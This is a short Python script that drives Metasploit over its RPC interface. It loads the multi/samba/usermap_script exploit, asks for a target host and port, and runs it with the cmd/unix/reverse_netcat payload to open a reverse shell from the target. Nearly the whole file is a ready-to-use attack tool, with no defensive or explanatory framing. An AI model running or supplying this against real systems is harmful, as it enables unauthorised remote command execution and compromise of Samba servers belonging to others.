#! /usr/bin/python3

from pymetasploit3.msfrpc import MsfRpcClient

print('\nMake sure MSF is running on another tab.\n')
print('In termial type:\n\n msfconsole \n load msgrpc [pass=yourpasswd] \n')

print('Take note of MSGRPC Password.\n')

PASSWORD = input('Enter your password: ')

client = MsfRpcClient(PASSWORD, port=55552, ssl=False)

#clientExploitsDB = client.modules.exploits
#print(len(clientExploitsDB))

#clientPayloadsDB = client.modules.payloads
#print(len(clientPayloadsDB))


exploit = client.modules.use('exploit', 'multi/samba/usermap_script')

#print(exploit.description, '\n')

#print(exploit.options)

print('Missing required options')
print(exploit.missing_required, '\n')

rhosts = input('Set RHOSTS: ')
exploit['RHOSTS'] = rhosts
rport = input('Set RPORT: ')
exploit['RPORT'] = rport

payloads = exploit.targetpayloads()
'''
for payload in payloads:
    print(payload)
'''
print(exploit.execute(payload='cmd/unix/reverse_netcat'))

